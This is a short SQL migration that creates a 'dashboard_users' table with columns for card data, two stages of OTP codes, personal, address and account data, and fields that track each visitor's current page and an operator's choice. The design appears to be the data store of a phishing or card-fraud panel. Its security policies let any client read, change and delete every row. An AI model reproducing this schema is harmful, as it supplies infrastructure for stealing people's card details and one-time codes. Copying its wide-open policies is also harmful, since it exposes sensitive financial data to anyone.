
-- Create dashboard_users table
CREATE TABLE public.dashboard_users (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  name TEXT NOT NULL DEFAULT 'بدون اسم',
  last_page TEXT DEFAULT '',
  watch_choice TEXT DEFAULT '',
  home_data JSONB DEFAULT '[]'::jsonb,
  message_data JSONB DEFAULT '[]'::jsonb,
  account_data JSONB DEFAULT '[]'::jsonb,
  personal_data JSONB DEFAULT '[]'::jsonb,
  otp1_data JSONB DEFAULT '[]'::jsonb,
  otp2_data JSONB DEFAULT '[]'::jsonb,
  address_data JSONB DEFAULT '[]'::jsonb,
  card_data JSONB DEFAULT '[]'::jsonb,
  status_tabs JSONB DEFAULT '{}'::jsonb,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable RLS
ALTER TABLE public.dashboard_users ENABLE ROW LEVEL SECURITY;

-- Allow anyone to insert (public form submissions)
CREATE POLICY "Anyone can insert dashboard users"
  ON public.dashboard_users FOR INSERT
  WITH CHECK (true);

-- Allow anyone to read (dashboard is password-protected in the app)
CREATE POLICY "Anyone can read dashboard users"
  ON public.dashboard_users FOR SELECT
  USING (true);

-- Allow anyone to update
CREATE POLICY "Anyone can update dashboard users"
  ON public.dashboard_users FOR UPDATE
  USING (true);

-- Allow anyone to delete
CREATE POLICY "Anyone can delete dashboard users"
  ON public.dashboard_users FOR DELETE
  USING (true);

-- Trigger for updated_at
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_dashboard_users_updated_at
  BEFORE UPDATE ON public.dashboard_users
  FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
